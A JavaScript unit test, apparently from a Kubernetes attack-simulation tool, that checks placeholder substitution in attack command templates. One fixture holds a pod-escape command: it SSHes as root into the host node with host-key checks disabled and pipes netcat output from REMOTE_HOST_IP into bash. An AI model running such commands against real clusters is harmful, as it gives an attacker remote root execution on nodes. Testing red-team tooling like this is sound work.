const assert = require('assert');
const lib = require('./lib/lib.js')

describe('attack_a_pod_replacements', () => {
  it("it should replace a single replace", () => {
    let attacks = {
      'escape_pod_via_ssh_aws': {
        'parameter': {'option_key': 'remote', 'replace': 'REMOTE_HOST_IP'},
        'commands': [
          "SSH_HOST=$(cat /mnt/node_volume/etc/hostname); ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i .ssh/id_rsa root@$SSH_HOST 'sudo /usr/bin/nc REMOTE_HOST_IP 5555 | /bin/bash'",
        ],
      },
    }
    const output = lib.replace_command_with_parameters(attacks['escape_pod_via_ssh_aws'], {remote: "mytesthost.test.com"})
    assert(output.commands[0].includes("mytesthost.test.com"))
    assert.doesNotMatch(output.commands[0], /.*REMOTE_HOST_IP.*/)
  })
  it("it should replace multiple replacements", () => {
    let attacks = {
      'escape_pod_via_ssh_aws': {
        'parameter': [
          {'option_key': 'remote', 'replace': 'REMOTE_HOST_IP'},
          {'option_key': 'sshkey', 'replace': 'SSH_KEY'},
          {'option_key': 'sshpubkey', 'replace': 'SSH_PUBKEY'},
        ],
        'commands': [
          "blah REMOTE_HOST_IP blah SSH_KEY blah SSH_PUBKEY"
        ],
      },
    }
    const remote = "host2"
    const sshkey = "abc"
    const sshpubkey = "abc"
    const output = lib.replace_command_with_parameters(attacks['escape_pod_via_ssh_aws'], {remote, sshkey, sshpubkey})
    assert.strictEqual(output.commands[0], `blah ${remote} blah ${sshkey} blah ${sshpubkey}`)
  })
})
